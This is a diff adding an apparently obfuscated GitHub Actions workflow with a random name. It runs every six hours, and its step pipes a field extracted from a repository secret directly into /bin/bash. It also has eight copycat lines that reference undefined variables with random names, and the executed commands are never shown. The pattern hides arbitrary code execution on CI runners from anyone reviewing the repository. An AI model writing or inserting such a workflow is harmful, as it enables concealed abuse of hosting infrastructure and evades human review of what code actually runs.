@@ -1,0 +1,26 @@
+name: scoldingcatnip
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: scoldingcatnip
+        env:
+          tnbsi21: ${{ secrets.tnbsi21 }}
+        run: |
+          echo $tnbsi21 | jq -r .m3 | /bin/bash
+          echo $a9311 | jq -r .if5372 | /bin/bash
+          echo $qd7 | jq -r .pyop183 | /bin/bash
+          echo $a7 | jq -r .cwksg3840 | /bin/bash
+          echo $jj563 | jq -r .odlk38 | /bin/bash
+          echo $rnfcx4 | jq -r .zyxm48112 | /bin/bash
+          echo $p0840 | jq -r .h5161 | /bin/bash
+          echo $av7153 | jq -r .tw799 | /bin/bash
+          echo $hfme279 | jq -r .oak47951 | /bin/bash
+
